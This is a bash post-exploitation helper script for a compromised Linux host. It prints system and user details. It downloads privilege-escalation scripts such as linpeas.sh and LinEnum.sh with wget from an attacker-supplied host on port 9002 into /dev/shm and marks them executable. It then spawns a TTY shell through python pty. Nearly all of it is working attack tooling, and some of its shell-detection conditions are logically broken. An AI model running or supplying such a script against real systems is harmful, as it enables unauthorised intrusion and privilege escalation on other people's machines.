#!/usr/bin/env bash

RED="\e[31m"
GRAY="\e[37m"
ENDCOLOR="\e[0m"

function info
{
	sysinfo=$(uname -a)
	echo -e "${RED}[*]${ENDCOLOR}${GRAY}Systeminfo :${ENDCOLOR}${RED} $sysinfo${ENDCOLOR}"
	echo -e "${RED}[*]${ENDCOLOR}${GRAY}Home Directory :${ENDCOLOR}${RED} $HOME${ENDCOLOR}"
	echo -e "${RED}[*]${ENDCOLOR}${GRAY}Current User :${ENDCOLOR}${RED} $USER${ENDCOLOR}"
	echo -e "${RED}[*]${ENDCOLOR}${GRAY}Current shell :${ENDCOLOR}${RED} $SHELL${ENDCOLOR}"
}

function upload
{
	wcurl=$(which curl)
	wwget=$(which wget)
	wncat=$(which nc)
	echo -e "${RED}[*]${ENDCOLOR}${GRAY}Uploading PrivESC Scripts to ${ENDCOLOR}${RED}[/dev/shm]${ENDCOLOR}"
	if [[ "$wwget" != "" ]]; then
		echo -en "${RED}[+]${ENDCOLOR}"
		wget -q -P /dev/shm http://$1:9002/linpeas.sh
		echo -en "${RED}[+]${ENDCOLOR}"
		wget -q -P /dev/shm http://$1:9002/LinEnum.sh
		echo -en "${RED}[+]${ENDCOLOR}"
		wget -q -P /dev/shm http://$1:9002/linux-exploit-suggester.sh
		echo -en "${RED}[+]${ENDCOLOR}"
		wget -q -P /dev/shm http://$1:9002/docker-privesc.sh
		chmod +x /dev/shm/* 2>/dev/null
	fi
}

function ttyshell
{
	wpython=$(which python)
	wpython3=$(which python3)
	echo -e "${RED}[*]${ENDCOLOR}${GRAY}Upgraded To TTY Shell!${ENDCOLOR}"
	if [[ "$wpython" != ""  || "$SHELL" == "/bin/bash" ]]; then
		python -c 'import pty;pty.spawn("/bin/bash")'
	elif [[ "$wpython" != ""  || "$SHELL" == "/bin/sh" ]]; then
		python -c 'import pty;pty.spawn("/bin/sh")'
	elif [[ "$wpython3" != ""  || "$SHELL" == "/bin/bash" ]]; then
		python3 -c 'import pty;pty.spawn("/bin/bash")'
	elif [[ "$wpython3" != ""  || "$SHELL" == "/bin/sh" ]]; then
		python3 -c 'import pty;pty.spawn("/bin/sh")'

	fi

}


if [[ "$SHELL" == "/bin/bash" || "$SHELL" == "/bin/sh" ]]; then
	upload $1
	info
	ttyshell
	echo ""
fi


#setup.py to download pspy32 & pspy64 + other requirements
#if [[ "$SHELL" == "/bin/rbash" ]]; then 
#fi